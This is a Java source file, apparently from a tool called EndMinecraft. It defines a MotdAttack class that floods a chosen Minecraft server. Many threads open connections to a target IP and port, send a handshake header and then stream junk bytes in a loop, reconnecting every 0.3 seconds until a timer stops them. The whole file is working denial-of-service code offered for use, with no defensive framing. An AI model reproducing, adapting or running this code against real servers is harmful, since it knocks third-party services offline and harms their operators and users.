package me.alikomi.endminecraft.tasks.attack;

import me.alikomi.endminecraft.utils.Util;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;

public class MotdAttack extends Util {

    public static boolean isAttacking;
    private static String ip;
    private static int port;
    private static int time;
    private static int thread;
    ArrayList<Thread> attackThreads = new ArrayList<>();
    private static Thread timerThread;

    public MotdAttack(String ip, int port, int time, int thread) {
        this.ip = ip;
        this.port = port;
        this.time = time;
        this.thread = thread;
    }

    public boolean startAttack() {
        try {
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(ip, port), 2000);
            socket.close();
            Thread.sleep(1000);
        } catch (IOException e) {
            e.printStackTrace();
            log("服务器连接失败！");
            return false;
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        isAttacking = true;
        for (int t = 0; t < thread; t++) {
            Thread tmpthread = new Thread(() -> {
                while (isAttacking) {
                    try {
                        Thread.sleep(300);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    try {
                        final Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(ip, port));
                        final byte[] head = new byte[]{0x07, 0x00, 0x04, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01};
                        if (socket.isConnected() && !socket.isClosed()) {
                            final OutputStream out = socket.getOutputStream();
                            out.write(head);
                            out.flush();
                            while (socket.isConnected() && !socket.isClosed() && isAttacking) {
                                for (int i = 0; i < 10; i++) {
                                    out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                                }
                                out.flush();
                            }
                            out.close();
                        }
                        socket.close();
                    } catch (final Exception e) {
                        e.printStackTrace();
                    }
                    log("连接被断开，0.3秒后重新连接");
                }
            });
            tmpthread.start();
            attackThreads.add(tmpthread);
        }
        timerThread = new Thread(() -> {
            try {
                Thread.sleep(time);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            isAttacking = false;
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            attackThreads.forEach(
                    (threads) -> {
                        if (threads.isAlive())
                            threads.stop();
                    });
        });
        timerThread.start();

        return true;

    }

    public boolean stopAttack() {
        isAttacking = false;
        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        attackThreads.forEach(
                (thread1 -> {
                    if (thread1.isAlive())
                        thread1.stop();
                })
        );
        timerThread.stop();
        return true;
    }
}
